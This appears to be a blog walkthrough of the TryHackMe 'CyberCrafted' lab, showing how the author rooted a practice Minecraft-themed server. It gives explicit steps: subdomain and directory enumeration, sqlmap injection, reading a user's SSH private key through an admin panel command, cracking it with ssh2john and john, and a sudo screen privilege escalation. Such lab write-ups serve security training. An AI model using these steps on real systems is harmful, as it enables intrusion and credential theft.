---
title: Try Hack Me CyberCrafted
date: 2021-11-24T15:54:45+05:30
lastmod: 2021-11-24T15:54:45+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/CyberCrafted.gif # for tryhackMe
simg: /img/CyberCrafted.png

categories:
  - TryHackMe
tags:
  - tryhackme
 

draft: false
description: TryHackMe Room {CyberCrafted} solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

Pwn this pay-to-win Minecraft server!

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|CyberCrafted|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/dd06737472c79a806e2049ddeb3af354.png)|
| <b> CyberCrafted [Free Room] </b>| [CyberCrafted](https://tryhackme.com/room/cybercrafted)|

## Task 01: Deploy the machine

## Task 02: Root it

### Answer the questions below

|Task|Question|Ans|
|:---|---|---|
|1|How many ports are open?|[2.1](#21)|
|2|What service runs on the highest port?|[2.2](#22)|
|3|Any subdomains? (Alphabetical order)|[2.3](#23)|
|4|On what page did you find the vulnerability?|[2.4](#24)|
|5|What is the admin's username? (Case-sensitive)|[2.5](#25)|
|6|What is the web flag?|[2.6](#26)|
|7|Can you get the Minecraft server flag?|[2.7](#27)|
|8|What is the name of the sketchy plugin?|[2.8](#28)|
|9|What is the user's flag?|[2.9](#29)|
|10|Finish the job and give me the root flag!|[2.10](#210)|
---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Initial recon

### nmap

basic nmap returns `2 open ports`

* Virtual Hosting:

     ```bash
     curl -I 10.10.204.106                                                                
     HTTP/1.1 302 Found
     Date: Wed, 24 Nov 2021 10:45:02 GMT
     Server: Apache/2.4.29 (Ubuntu)
     Location: http://cybercrafted.thm/
     Content-Type: text/html; charset=UTF-8
     ```

* curl returns a domain name, let's add that to our `/etc/hosts` file.

### SqlMap

* capture the req for `http://store.cybercrafted.thm/search.php` using burp and save it as **search.req**
* run it through `sqlmap -r search.req`
* command: `sqlmap -r search.req --dbs`

### login to admin portal

* we got creds from [sqlmap](#sqlmap)
* you can find the `plain text password` of hash on `crackstation.net`

### ssh-key

* once you save the key
* use `ssh2john` to generate the crackable hash; `locate ssh2john` to find the file on your attacker machine
* `usr/share/john/ssh2john.py creeper.key > cracking.hash` 
* cracking: `john cracking.hash --wordlist=/usr/share/wordlists/rockyou.txt`
  
---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

## Flags

### 2.1

ref to [nmap](#nmap)

### 2.2

ref to [nmap](#nmap)

or

`nmap -sC -sV IP:HigherPort(open)`

### 2.3

* Wordlist : [SecLists](https://github.com/danielmiessler/SecLists)
* commaand:
  `gobuster vhost -u domain.thm -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

### 2.4

* initial enum shows web-service running `php`
* let's run `gobuster`
* command:
  `gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o store.out -x php `

### 2.5

ref to [Sqlmap](#sqlmap)

### 2.6

ref to [Sqlmap](#sqlmap)

### 2.7

* once you login to [admin panel](#login-to-admin-portal)
* you can download the `.ssh` keys for `xXUltimateCreeperXx`
* on `http://admin.cybercrafted.thm/panel.php` run this `cat /home/xxultimatecreeperxx/.ssh/id_rsa`
* save the key
* ref to [ssh-key](#ssh-key)
* login as `xxultimatecreeperxx`
* find `mindcraft` dir
* find command `find / -name 'minecraft' 2>/dev/null`
* you'll see the flag on the directory

#### 2.8

* list the plugins `ls /opt/minecraft/cybercrafted/plugins/`

### 2.9

* goto `sketchy plugin` directory
* you'll see the creds on `log.txt`
* use that to elevate to `cybercrafted`
* read the `user` flag.

### 2.10

* check with `sudo -l`

     ```bash
     cybercrafted@cybercrafted:~$ sudo -l 
     Matching Defaults entries for cybercrafted on cybercrafted:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

     User cybercrafted may run the following commands on cybercrafted:
     (root) /usr/bin/screen -r cybercrafted
     ```

* check `gtfobins` for screen
* run the `sudo command` then type `CTRL+A` & `c` to get the shell.
* read the root flag.

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
